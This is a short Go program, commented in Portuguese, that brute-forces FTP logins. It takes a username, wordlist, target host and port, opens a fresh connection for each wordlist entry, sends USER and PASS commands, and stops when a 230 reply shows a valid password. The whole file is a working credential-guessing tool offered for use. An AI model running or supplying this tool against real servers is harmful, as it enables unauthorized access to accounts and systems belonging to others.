package main

import (
	"fmt"
	"os"
	"bufio"
	"net"
	"strings"
)

func main() {
	// verifica a qtd de argumentos passados
	if len(os.Args[1:]) != 4 {
		fmt.Println("[*] Usage: go run brute-ftp.go <user> <wordlist> <target> <port>")
		os.Exit(1)
	}
	// conecta no host
	c, err := net.Dial("tcp", os.Args[3]+":"+os.Args[4])
	if err != nil {
		fmt.Println(err)
	}
	// lê o banner
	r, err := bufio.NewReader(c).ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}
	// printa o banner
	fmt.Println("[+] Conectado!")
	fmt.Println(r)
	
	//fecha conexao
	c.Close()

	// abre wordlist
	f, err := os.Open(os.Args[2])
		if err != nil {
			fmt.Println(err)
		}
	// manda fechar o arquivo wordlist no fim da execucao
	defer f.Close()
	// cria um scanner para ler o arquivo
	scanner := bufio.NewScanner(f)
	// itera sobre o arquivo para ler as linhas
	for scanner.Scan() {
		// conecta no host
		c, err := net.Dial("tcp", os.Args[3]+":"+os.Args[4])
		if err != nil {
			fmt.Println(err)
		}
		// inicia brute force		
		fmt.Println("[*] Testando " + os.Args[1] + ":" + scanner.Text())
		// envia usuario
		fmt.Fprintf(c, "USER " + os.Args[1] + "\r\n")
		r, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}

		r = ""
		// envia senha
		fmt.Fprintf(c, "PASS " + scanner.Text() + "\r\n")
		
		r, err = bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		// verifica resposta. se houver 230 o login é válido
		if strings.Contains(r, "230") {
			fmt.Println("[+] Senha encontrada: " + scanner.Text())
			os.Exit(0)	
		}
		// fecha conexao
		c.Close()
	}

	if err := scanner.Err(); err != nil {
		fmt.Println(err)
	}

	fmt.Println("\n[-] Fim da execucao! Nao foi possivel encontrar a senha!")

}